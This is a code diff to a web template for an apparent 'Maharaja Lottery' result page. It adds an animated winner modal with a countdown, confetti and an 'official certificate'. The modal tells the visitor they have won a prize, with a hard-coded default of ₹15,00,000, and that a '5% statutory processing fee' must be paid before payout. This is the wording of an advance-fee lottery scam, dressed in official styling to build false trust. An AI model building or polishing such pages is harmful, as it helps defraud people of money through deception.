@@ -150,7 +150,75 @@
                 @endphp
 
                 @if($isWinner)
-                    <!-- CASE 1A: WINNER FOUND -> MEGA CELEBRATION BOOM & OFFICIAL CERTIFICATE -->
+                    <!-- CASE 1A: PRE-CELEBRATION WINNER ANNOUNCEMENT MODAL -->
+                    <div id="winner-announcement-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 transition-all duration-500 opacity-100 scale-100">
+                        <!-- Ambient Glow in Background -->
+                        <div class="absolute w-96 h-96 bg-[#DFB755]/25 rounded-full blur-3xl pointer-events-none"></div>
+
+                        <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-2 sm:border-3 border-[#DFB755] rounded-3xl p-6 sm:p-8 max-w-lg w-full text-center text-white shadow-[0_0_60px_rgba(223,183,85,0.4)] overflow-hidden space-y-5 animate-in zoom-in-95 duration-300">
+                            
+                            <!-- Sparkle Decorative Pattern -->
+                            <div class="absolute inset-0 opacity-15 bg-[radial-gradient(#DFB755_1px,transparent_1px)] [background-size:14px_14px] pointer-events-none"></div>
+                            
+                            <!-- Glowing Trophy Icon -->
+                            <div class="relative z-10 mx-auto w-16 h-16 sm:w-20 sm:h-20 rounded-2xl bg-gradient-to-tr from-[#C59B27] via-[#F3D068] to-[#DFB755] text-[#071533] flex items-center justify-center text-3xl sm:text-4xl shadow-xl shadow-amber-500/20 animate-bounce">
+                                <i class="fa-solid fa-trophy"></i>
+                            </div>
+
+                            <!-- Header -->
+                            <div class="relative z-10 space-y-1.5">
+                                <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[10px] sm:text-xs font-black uppercase tracking-widest bg-[#DFB755]/20 text-[#F3D068] border border-[#DFB755]/40">
+                                    <i class="fa-solid fa-crown text-[10px]"></i>
+                                    <span>Official Prize Winner Declared</span>
+                                    <i class="fa-solid fa-crown text-[10px]"></i>
+                                </div>
+                                
+                                <h3 class="text-xl sm:text-3xl font-serif font-black text-white">
+                                    Congratulations,<br>
+                                    <span class="text-transparent bg-clip-text bg-gradient-to-r from-[#F5D77F] via-[#FFE8A2] to-[#DFB755]">
+                                        {{ $searchResult['customer_name'] }}!
+                                    </span>
+                                </h3>
+                            </div>
+
+                            <!-- Refined Winner Announcement Note -->
+                            <div class="relative z-10 bg-black/40 border border-[#DFB755]/30 rounded-2xl p-4 sm:p-5 text-left space-y-3">
+                                <div class="flex items-center justify-between pb-2 border-b border-white/10">
+                                    <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Winning Position</span>
+                                    <span class="text-sm font-black text-[#F3D068] font-serif">{{ $searchResult['result_status'] ?? '3rd Prize' }}</span>
+                                </div>
+
+                                <div class="flex items-center justify-between pb-2 border-b border-white/10">
+                                    <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Winning Prize Amount</span>
+                                    <span class="text-base sm:text-lg font-mono font-black text-emerald-400">{{ !empty($searchResult['prize_amount']) ? $searchResult['prize_amount'] : '₹15,00,000' }}</span>
+                                </div>
+
+                                <p class="text-xs text-stone-300 leading-relaxed font-normal pt-1">
+                                    You have won <strong class="text-[#F3D068]">{{ !empty($searchResult['prize_amount']) ? $searchResult['prize_amount'] : '₹15,00,000' }} ({{ $searchResult['result_status'] ?? '3rd Prize' }})</strong> in <strong>Maharaja Lottery</strong>. As per directorate claim policy, a <strong class="text-amber-300">5% statutory processing fee</strong> is required to be cleared with Maharaja Lottery before the remaining prize balance is disbursed to your account.
+                                </p>
+                            </div>
+
+                            <!-- Progress Bar & Auto-close Timer -->
+                            <div class="relative z-10 space-y-3 pt-1">
+                                <div class="w-full bg-white/10 rounded-full h-1.5 overflow-hidden">
+                                    <div id="modal-progress-bar" class="bg-gradient-to-r from-[#C59B27] via-[#F3D068] to-[#16A34A] h-full w-full transition-all duration-[3000ms] ease-linear"></div>
+                                </div>
+
+                                <div class="flex items-center justify-between text-[11px] text-stone-400">
+                                    <span>Opening official certificate...</span>
+                                    <span class="font-mono font-bold text-[#F3D068]"><span id="popup-timer-sec">3</span>s</span>
+                                </div>
+
+                                <button type="button" onclick="closeWinnerAnnouncementModal()" class="w-full py-3 px-6 rounded-xl bg-gradient-to-r from-[#C59B27] via-[#F3D068] to-[#C59B27] hover:from-[#B8860B] hover:to-[#DFB755] text-[#071533] font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg transition-transform transform hover:scale-[1.02] flex items-center justify-center gap-2 cursor-pointer">
+                                    <span>View Official Certificate Now</span>
+                                    <i class="fa-solid fa-arrow-right text-xs"></i>
+                                </button>
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <!-- CASE 1B: WINNER CELEBRATION & OFFICIAL CERTIFICATE -->
                     <div class="space-y-8 animate-in fade-in zoom-in-95 duration-300" id="winner-celebration-wrapper">
                         
                         <!-- Celebration Hero Boom Banner -->
@@ -673,11 +741,77 @@
         }, 400);
     }
 
+    // Popup Modal Timer & Transition Management
+    let modalTimerId = null;
+    let countdownIntervalId = null;
+
+    function startWinnerPopupCountdown() {
+        const modal = document.getElementById('winner-announcement-modal');
+        const progressBar = document.getElementById('modal-progress-bar');
+        const timerSecSpan = document.getElementById('popup-timer-sec');
+
+        // Pre-render certificate in background so it's instantly crisp
+        generateAndRenderCertificate();
+
+        if (!modal) {
+            triggerWinnerConfettiBoom();
+            return;
+        }
+
+        // 1. Initial Confetti Boom on popup open
+        setTimeout(triggerWinnerConfettiBoom, 300);
+
+        // 2. Animate progress bar to 0% over 3000ms
+        setTimeout(() => {
+            if (progressBar) {
+                progressBar.style.width = '0%';
+            }
+        }, 100);
+
+        // 3. Countdown numbers (3 -> 2 -> 1 -> 0)
+        let secondsLeft = 3;
+        countdownIntervalId = setInterval(() => {
+            secondsLeft--;
+            if (timerSecSpan && secondsLeft >= 0) {
+                timerSecSpan.innerText = secondsLeft;
+            }
+            if (secondsLeft <= 0) {
+                clearInterval(countdownIntervalId);
+            }
+        }, 1000);
+
+        // 4. Auto dismiss after 3.2s
+        modalTimerId = setTimeout(() => {
+            closeWinnerAnnouncementModal();
+        }, 3200);
+    }
+
+    function closeWinnerAnnouncementModal() {
+        const modal = document.getElementById('winner-announcement-modal');
+        if (!modal) return;
+
+        if (modalTimerId) clearTimeout(modalTimerId);
+        if (countdownIntervalId) clearInterval(countdownIntervalId);
+
+        // Smooth fade out
+        modal.classList.remove('opacity-100', 'scale-100');
+        modal.classList.add('opacity-0', 'scale-95', 'pointer-events-none');
+
+        setTimeout(() => {
+            modal.style.display = 'none';
+        }, 500);
+
+        // 5. Trigger second grand celebration boom & ensure certificate is ready
+        setTimeout(() => {
+            triggerWinnerConfettiBoom();
+            generateAndRenderCertificate();
+        }, 250);
+    }
+
     // Auto-initialize on page load
     document.addEventListener('DOMContentLoaded', function() {
         @if(isset($searchResult) && $searchState === 'approved' && ($isWinner ?? false))
-            generateAndRenderCertificate();
-            setTimeout(triggerWinnerConfettiBoom, 400);
+            startWinnerPopupCountdown();
         @endif
     });
 </script>
